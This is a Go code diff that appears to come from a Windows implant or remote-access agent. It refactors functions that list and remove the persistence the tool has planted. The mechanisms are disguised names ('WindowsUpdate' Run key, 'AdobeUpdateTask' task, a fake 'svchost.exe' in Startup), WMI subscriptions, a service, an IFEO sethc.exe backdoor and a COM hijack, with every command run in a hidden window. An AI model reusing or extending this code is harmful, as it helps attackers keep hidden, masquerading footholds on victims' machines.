@@ -404,33 +404,54 @@ func listPersistence() string {
 		appData = os.Getenv("LOCALAPPDATA")
 	}
 
-	cmd := exec.Command("reg", "query", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate")
-	applyHideWindow(cmd)
-	if out, _ := cmd.CombinedOutput(); len(out) > 0 {
-		results = append(results, "[+] Registry Run key (WindowsUpdate): found")
+	regFound := ""
+	for _, name := range persistenceNames("registry_run", persistencePrefix) {
+		cmd := exec.Command("reg", "query", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", name)
+		applyHideWindow(cmd)
+		if commandFound(cmd.CombinedOutput()) {
+			regFound = name
+			break
+		}
+	}
+	if regFound != "" {
+		results = append(results, "[+] Registry Run key ("+regFound+"): found")
 	} else {
-		results = append(results, "[-] Registry Run key (WindowsUpdate): not found")
+		results = append(results, "[-] Registry Run key: not found")
 	}
 
-	cmd2 := exec.Command("schtasks", "/query", "/tn", "AdobeUpdateTask", "/fo", "LIST")
-	applyHideWindow(cmd2)
-	if out, _ := cmd2.CombinedOutput(); len(out) > 0 {
-		results = append(results, "[+] Scheduled task (AdobeUpdateTask): found")
+	taskFound := ""
+	for _, name := range persistenceNames("scheduled_task", persistencePrefix) {
+		cmd := exec.Command("schtasks", "/query", "/tn", name, "/fo", "LIST")
+		applyHideWindow(cmd)
+		if commandFound(cmd.CombinedOutput()) {
+			taskFound = name
+			break
+		}
+	}
+	if taskFound != "" {
+		results = append(results, "[+] Scheduled task ("+taskFound+"): found")
 	} else {
-		results = append(results, "[-] Scheduled task (AdobeUpdateTask): not found")
+		results = append(results, "[-] Scheduled task: not found")
 	}
 
-	startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe`)
-	if _, err := os.Stat(startupPath); err == nil {
-		results = append(results, "[+] Startup folder: svchost.exe present")
+	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
+	fileFound := ""
+	for _, name := range persistenceNames("startup_file", persistencePrefix) {
+		if _, err := os.Stat(filepath.Join(startupDir, name)); err == nil {
+			fileFound = name
+			break
+		}
+	}
+	if fileFound != "" {
+		results = append(results, "[+] Startup folder: "+fileFound+" present")
 	} else {
-		results = append(results, "[-] Startup folder: svchost.exe not found")
+		results = append(results, "[-] Startup folder: no known persistence file")
 	}
 
 	psCmd := "Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like \"*" + persistencePrefix + "*\" } | Format-List | Out-String"
 	cmd3 := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
 	applyHideWindow(cmd3)
-	if out, _ := cmd3.CombinedOutput(); len(strings.TrimSpace(string(out))) > 0 {
+	if commandFound(cmd3.CombinedOutput()) {
 		results = append(results, "[+] WMI subscription ("+persistencePrefix+"): found")
 	} else {
 		results = append(results, "[-] WMI subscription ("+persistencePrefix+"): not found")
@@ -438,7 +459,7 @@ func listPersistence() string {
 
 	cmd4 := exec.Command("sc", "query", persistencePrefix+"Svc")
 	applyHideWindow(cmd4)
-	if out, _ := cmd4.CombinedOutput(); strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED") {
+	if out, err := cmd4.CombinedOutput(); err == nil && (strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED")) {
 		results = append(results, "[+] Service ("+persistencePrefix+"Svc): found")
 	} else {
 		results = append(results, "[-] Service ("+persistencePrefix+"Svc): not found")
@@ -446,7 +467,7 @@ func listPersistence() string {
 
 	cmd5 := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/v", "Debugger")
 	applyHideWindow(cmd5)
-	if out, _ := cmd5.CombinedOutput(); len(out) > 0 {
+	if commandFound(cmd5.CombinedOutput()) {
 		results = append(results, "[+] IFEO sethc.exe debugger: found")
 	} else {
 		results = append(results, "[-] IFEO sethc.exe debugger: not found")
@@ -454,7 +475,7 @@ func listPersistence() string {
 
 	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5A-A625-EC63F3824F4E}`)
 	applyHideWindow(cmd6)
-	if out, _ := cmd6.CombinedOutput(); len(out) > 0 {
+	if commandFound(cmd6.CombinedOutput()) {
 		results = append(results, "[+] COM hijack CLSID: found")
 	} else {
 		results = append(results, "[-] COM hijack CLSID: not found")
@@ -489,7 +510,7 @@ func removePersistence(method string, args string) string {
 		// Remove both the auto-install name (WindowsUpdate) and the explicit
 		// install name (persistencePrefix) so cleanup matches either scheme.
 		removed := false
-		for _, name := range []string{"WindowsUpdate", persistencePrefix} {
+		for _, name := range persistenceNames("registry_run", persistencePrefix) {
 			cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", name, "/f")
 			applyHideWindow(cmd)
 			if _, err := cmd.CombinedOutput(); err == nil {
@@ -503,7 +524,7 @@ func removePersistence(method string, args string) string {
 
 	case "scheduled_task":
 		removed := false
-		for _, name := range []string{"AdobeUpdateTask", persistencePrefix + "Update"} {
+		for _, name := range persistenceNames("scheduled_task", persistencePrefix) {
 			cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
 			applyHideWindow(cmd)
 			if _, err := cmd.CombinedOutput(); err == nil {
@@ -522,7 +543,7 @@ func removePersistence(method string, args string) string {
 		}
 		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
 		removed := false
-		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
+		for _, name := range persistenceNames("startup_file", persistencePrefix) {
 			if err := os.Remove(filepath.Join(startupDir, name)); err == nil {
 				removed = true
 			}
